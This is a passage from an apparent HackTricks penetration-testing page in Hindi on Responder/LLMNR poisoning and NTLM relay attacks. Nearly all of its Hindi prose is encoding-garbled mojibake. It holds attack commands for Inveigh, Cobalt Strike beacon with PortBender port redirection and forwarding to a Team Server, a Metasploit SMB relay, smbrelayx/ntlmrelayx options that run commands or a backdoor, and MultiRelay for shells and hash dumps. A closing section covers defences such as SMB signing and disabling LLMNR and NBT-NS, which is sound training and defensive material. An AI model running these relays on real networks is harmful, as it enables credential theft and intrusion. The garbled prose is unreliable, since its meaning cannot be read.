Responder **рд╕рднреА рд╕реЗрд╡рд╛рдУрдВ рдХреА рдирдХрд▓ рдХрд░реЗрдЧрд╛ рдЬреЛ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИрдВ**ред рдЬрдм рдХреЛрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рд▓ рдХреА рдЬрд╛ рд░рд╣реА рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, **рд╡рд╣ Responder рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧрд╛** рдФрд░ Responder "рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рд╛рдЦ" (рдЬреНрдпрд╛рджрд╛рддрд░ рд╕рдВрднрд╛рд╡рдирд╛ **NTLMv2 Challenge/Response**) рдХреЛ **рдХреИрдкреНрдЪрд░** рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛:

NetNTLMv1 рдореЗрдВ рдбрд╛рдЙрдирдЧреНрд░реЗрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдпрд╛ ESS рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - C#/PowerShell Responder

> Inveigh рдПрдХ PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS рд╕реНрдкреВрдлрд░ рдФрд░ рдореИрди-рдЗрди-рдж-рдорд┐рдбрд▓ рдЯреВрд▓ рд╣реИ рдЬреЛ рдкреЗрдирдЯреЗрд╕реНрдЯрд░реНрд╕/рд░реЗрдб рдЯреАрдорд░реНрд╕ рдХреА рд╕рд╣рд╛рдпрддрд╛ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ рдЦреБрдж рдХреЛ рдХреЗрд╡рд▓ рдПрдХ Windows рд╕рд┐рд╕реНрдЯрдо рддрдХ рд╕реАрдорд┐рдд рдкрд╛рддреЗ рд╣реИрдВред

[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) рдкрд╣рд▓реЗ рдПрдХ PowerShell рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдереА, рдЕрдм рдпрд╣ рдПрдХ C# рдмрд╛рдЗрдирд░реА рд╣реИ рдЬрд┐рд╕рдореЗрдВ Responder рдХреЗ рд╕рдорд╛рди рдореБрдЦреНрдп рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдВ рд╣реИрдВред рдПрдХ [**рд╡рд┐рдХреА**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) \*\*\*\* рд╣реИ рдЬреЛ рд╕рднреА рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдФрд░ рдЙрдкрдпреЛрдЧ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рддреА рд╣реИред\
рдПрдХ рдЕрдиреНрдп рд╕рдВрд╕реНрдХрд░рдг [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

рдпрд╛ рдЗрд╕реЗ рдЕрдзрд┐рдХ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдПрдВ:
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
рдпрд╛ C# рд╕рдВрд╕реНрдХрд░рдг рдЪрд▓рд╛рдПрдВ:
```bash
Inveigh.exe
```
## NTLM рд░рд┐рд▓реЗ рдЕрдЯреИрдХ

рдпрд╣ рдЕрдЯреИрдХ **SMB рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рддреНрд░реЛрдВ** рдХреЛ рдПрдХ рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ **рд▓рдХреНрд╖реНрдп рдорд╢реАрди** рдХреА рдУрд░ рд░рд┐рд▓реЗ рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдкреНрд░рдорд╛рдгреАрдХрд░рдг **рд╕рддреНрд░ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ**, рддреЛ рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЖрдкрдХреЛ рдПрдХ **рд╕рд┐рд╕реНрдЯрдо** **рд╢реЗрд▓** рдореЗрдВ рдбрд╛рд▓ рджреЗрдЧрд╛ред рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд░рд┐рд▓реЗ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЙрд╕ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рд░рд┐рд▓реЗ рдХрд┐рдП рдЧрдП** рд╣реЛрд╕реНрдЯ рдкрд░ рд▓реЛрдХрд▓ рдПрдбрдорд┐рди рдПрдХреНрд╕реЗрд╕ рд╣реЛ рдФрд░ **SMB рд╕рд╛рдЗрдирд┐рдВрдЧ рдЕрдХреНрд╖рдо рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП**ред

### 445 рдлреЙрд░рд╡рд░реНрдб рдФрд░ рдЯрдирд▓рд┐рдВрдЧ

{% hint style="warning" %}
рдпрджрд┐ рдЖрдк **рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдорд╢реАрди рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрднрд╛рдЧ рдХреЗ рдХрд┐рд╕реА рднреА **рдЯреВрд▓** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░рд┐рд▓реЗ рдЕрдЯреИрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрдкрдХреЛ рдЗрд╕рдХреА рдЪрд┐рдВрддрд╛ рдХрд░рдиреЗ рдХреА рдЬрд░реВрд░рдд рдирд╣реАрдВ рд╣реИред
{% endhint %}

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд░реЗрдб рдЯреАрдореЛрдВ рдореЗрдВ рдРрд╕рд╛ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рд░реЗрдб рдЯреАрдореЛрдВ рдореЗрдВ рдЖрдкрдХреЛ рдЖрдорддреМрд░ рдкрд░ **рд╡рд┐рдВрдбреЛрдЬ рдорд╢реАрди рдХреЗ рдкреЛрд░реНрдЯ 445 рдХреЗ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдЕрдкрдиреА рдорд╢реАрди рдкрд░ рдлреЙрд░рд╡рд░реНрдб рдХрд░рдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реЛрддреА рд╣реИ** рдЬреЛ рдХрд┐рд╕реА рднреА рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЯреВрд▓реНрд╕ рдХреЛ рдЪрд▓рд╛ рд░рд╣реА рд╣реЛ рдФрд░ рдлрд┐рд░ рдЙрд╕ рдЯреВрд▓ рдХреЗ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдПрдХ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд╛рдкрд╕ рд░реВрдЯ рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдорд╢реАрди рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХреЗрдВред

рдЯреВрд▓ [**PortBender**](https://github.com/praetorian-inc/PortBender) \*\*\*\* рдПрдХ рдбреНрд░рд╛рдЗрд╡рд░ рд╣реИ рдЬреЛ рдкреЛрд░реНрдЯ **445 рдкрд░ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рджреВрд╕рд░реЗ рдкреЛрд░реНрдЯ** (рдЬреИрд╕реЗ рдХрд┐ 8445) рдкрд░ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ рдЬрд┐рд╕реЗ **рд╣рдо рдмрд╛рдЗрдВрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕рдХреЗ рд▓рд┐рдП рдбреНрд░рд╛рдЗрд╡рд░ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд▓реЛрдХрд▓ рдПрдбрдорд┐рди** рдПрдХреНрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред `cd C:\Windows\System32\drivers` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдордЭ рдореЗрдВ рдЖрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣реАрдВ рдЕрдзрд┐рдХрд╛рдВрд╢ рд╡рд┐рдВрдбреЛрдЬ рдбреНрд░рд╛рдЗрд╡рд░реНрд╕ рд╣реЛрддреЗ рд╣реИрдВред
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### рдореЗрдЯрд╛рд╕реНрдкреНрд▓реЙрдЗрдЯ
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### рдорд▓реНрдЯреАрд░рд┐рд▓реЗ

рдпрджрд┐ рдЖрдк **MultiRelay** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, _**/usr/share/responder/tools**_ рдкрд░ рдЬрд╛рдПрдВ рдФрд░ MultiRelay рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ (`-t <IP target> -u <User>`):
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
### Force NTLM Logins

Windows рдореЗрдВ рдЖрдк **рдХреБрдЫ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдЦрд╛рддреЛрдВ рдХреЛ рдордирдорд╛рдиреА рдорд╢реАрдиреЛрдВ рдкрд░ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдкрдврд╝реЗрдВ:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## рд╕рдорд╛рдзрд╛рди

### LLMNR рдЕрдХреНрд╖рдо рдХрд░рдирд╛

DNS рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЗ рдбреЛрдореЗрди рдореЗрдВ LLMNR рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, gpedit.msc рдЦреЛрд▓реЗрдВред\
Computer Configuration->Administrative Templates->Network->DNS client рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░реЗрдВред\
тАЬTurn off multicast name resolutionтАЭ рд╡рд┐рдХрд▓реНрдк рдЦреЛрдЬреЗрдВ рдФрд░ тАЬpolicy settingтАЭ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ:

![](../../.gitbook/assets/1.jpg)

рдирдИ рд╡рд┐рдВрдбреЛ рдЦреБрд▓рдиреЗ рдкрд░, рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ, Apply рджрдмрд╛рдПрдВ рдФрд░ OK рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ:

![](../../.gitbook/assets/2.jpg)

### **NBT-NS рдЕрдХреНрд╖рдо рдХрд░рдирд╛**

NBT-NS рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╡рд┐рдХрд▓реНрдк DHCP рд╕реНрдХреЛрдк рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред

Microsoft рдХреЗ DHCP рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп, рдЙрд╕ рд╕реНрдХреЛрдк рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рдЖрдк NBT-NS рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред тАЬScope OptionsтАЭ рдкрд░ рд░рд╛рдЗрдЯ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ тАЬConfigure OptionsтАЭ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдореИрдВ NBT-NS рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реВрдБ рдЬрд┐рд╕рдХрд╛ DHCP рд╕реНрдХреЛрдк 192.168.1.100 рд╣реИред

![](../../.gitbook/assets/3.jpg)

Scope Options рд╡рд┐рдВрдбреЛ рдореЗрдВ, рдПрдбрд╡рд╛рдВрд╕реНрдб рдЯреИрдм рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░реЗрдВ, рдбреНрд░реЙрдк рдбрд╛рдЙрди рд╡рд┐рдВрдбреЛ рдХреЛ тАЬMicrosoft Windows 2000 OptionsтАЭ рдореЗрдВ рдмрджрд▓реЗрдВ:

![](../../.gitbook/assets/4.jpg)

рд╕реВрдЪреА рд╕реЗ тАЬ001 Microsoft Disable Netbios OptionтАЭ рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ рдЗрд╕рдХрд╛ рдорд╛рди тАЬ0x2тАЭ рдореЗрдВ рдмрджрд▓реЗрдВ, Apply рджрдмрд╛рдПрдВ рдФрд░ рдлрд┐рд░ OK рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ:

![](../../.gitbook/assets/5.jpg)

### WPAD

WPAD рд╣рдорд▓реЗ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП, рдЖрдк рдЕрдкрдиреЗ DNS рдЬрд╝реЛрди рдореЗрдВ "wpad" рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ DNS рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ рд╡реИрдз WPAD рд╕рд░реНрд╡рд░ рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред рдЬрдм рддрдХ рдХреНрд╡реЗрд░реАрдЬрд╝ рд╣рд▓ рд╣реЛ рдЬрд╛рддреА рд╣реИрдВ, рд╣рдорд▓рд╛ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### рдорд▓реНрдЯреА-рд░рд┐рд▓реЗ

1\. **рд╕рднреА рд╕реНрдерд╛рдиреАрдп рд╡рд┐рдВрдбреЛрдЬ рдорд╢реАрдиреЛрдВ рдкрд░ SMB рд╕рд╛рдЗрдирд┐рдВрдЧ рдХреЛ рдордЬрдмреВрд░ рдХрд░рдирд╛**ред рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рдкреНрд░рддреНрдпреЗрдХ SMB рд╕рддреНрд░ рдХреЛ рдбрд┐рдЬрд┐рдЯрд▓реА рд╕рд╛рдЗрди рдХрд░реЗрдЧреА рдЬрд┐рд╕рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдФрд░ рд╕рд░реНрд╡рд░ рджреЛрдиреЛрдВ рдХреЛ рдкреИрдХреЗрдЯреНрд╕ рдХреЗ рд╕реНрд░реЛрдд рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреА рд╣реЛрдЧреА рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рд╡реЗ рдЬрд╛рд░реА рд░рдЦреЗрдВред рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рдХреЗрд╡рд▓ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕рдХреНрд╖рдо рд╣реЛрддреА рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд Microsoft рдХреЗ рд▓реЗрдЦ рдЗрди рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХрд╛ рд╡рд┐рд╡рд░рдг рджреЗрддреЗ рд╣реИрдВ (рдЬрд┐рдиреНрд╣реЗрдВ рдЧреНрд░реБрдк рдкреЙрд▓рд┐рд╕реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ), рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХреИрд╕реЗ рд▓рд╛рдЧреВ рдХрд░реЗрдВред

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **рд╕рдореАрдХреНрд╖рд╛ рдХрд░рдирд╛ рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рдХрд┐ рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗрд╡рд▓ рдЙрди рдорд╢реАрдиреЛрдВ рдкрд░ рджреВрд░рд╕реНрде рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рдпрд╣ рдЖрд╡рд╢реНрдпрдХ рд╣реИ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: Sally рдХреЗрд╡рд▓ Sally рдХреЗ рд╡рд░реНрдХрд╕реНрдЯреЗрд╢рди рдкрд░ рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддреА рд╣реИред рдпрджрд┐ рдХреЛрдИ рд╣рдорд▓рд╛рд╡рд░ Sally рдХреЗ SMB Auth рд╕рддреНрд░ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╡реЗ рд╕рддреНрд░ рдХреЛ рдХрд┐рд╕реА рднреА рд╡рд░реНрдХрд╕реНрдЯреЗрд╢рди рдкрд░ рд░рд┐рд▓реЗ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ, рдЬрд┐рд╕рд╕реЗ рдпрд╣ рд╡рд┐рдзрд┐ рдмреЗрдХрд╛рд░ рд╣реЛ рдЬрд╛рддреА рд╣реИред

3\. **рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЬрд┐рддрдирд╛ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХреЗ рд╕реАрдорд┐рдд рдХрд░реЗрдВ**ред рдпрд╣ рд╣рдорд▓рд╛ Kerberos рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рд▓рд╛рдн рдирд╣реАрдВ рдЙрдард╛ рд╕рдХрддрд╛, рдЗрд╕рд▓рд┐рдП NTLM рдХреА рдорд╛рддреНрд░рд╛ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рдХреЗ, рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрд╛рдлреА рд╣рдж рддрдХ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред Microsoft рд╕реЗ рдЗрд╕реЗ рд╕рдВрднрд╡ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд╛рдирдХрд╛рд░реА рд╣реИ, рд▓реЗрдХрд┐рди рд╕рд╛рд╡рдзрд╛рди рд░рд╣реЗрдВ.. рдпрджрд┐ Kerberos рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд┐рд╕реА рдХрд╛рд░рдг рд╕реЗ рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЖрдорддреМрд░ рдкрд░ NTLM рдкрд░ рд╡рд╛рдкрд╕ рдЖ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдЖрдк рдЗрд╕реЗ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЕрдХреНрд╖рдо рдХрд░ рджреЗрддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХрд╛ рдиреЗрдЯрд╡рд░реНрдХ рдардк рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

4\. **рдЕрдкрдиреЗ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдЕрдирдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд░реЛрдХреЗрдВ**ред рдПрдХ рдЖрдВрддрд░рд┐рдХ рдЦрддрд░рд╛ рд╢рд╛рдпрдж SMB рд░рд┐рд▓реЗ рд╣рдорд▓реЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░реЗрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ рдЙрдирдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдиреЗрдЯрд╡рд░реНрдХ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╣реИрдВред рдЕрдкрдиреА рднреМрддрд┐рдХ рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐рдпреЛрдВ рдХреЛ рдордЬрдмреВрдд рдХрд░рдХреЗ, ACLs рдФрд░ MAC рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рд░реЛрдЧреА рдЙрдкрдХрд░рдгреЛрдВ рдХреЛ рд░реЛрдХрдирд╛, рдФрд░ рдЙрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдХреЗ, рдЖрдк рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрд┐рдП рдЬрд╛рдиреЗ рдХреЗ рдЦрддрд░реЗ рдХреЛ рдХрд╛рдлреА рд╕реАрдорд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## рд╕рдВрджрд░реНрдн

* [**https://intrinium.com/smb-relay-attack-tutorial/**](https://intrinium.com/smb-relay-attack-tutorial/)
* **рдЪрд┐рддреНрд░ рд╕реНрд░реЛрдд:**\
[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)\
[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)\
[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)\
[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
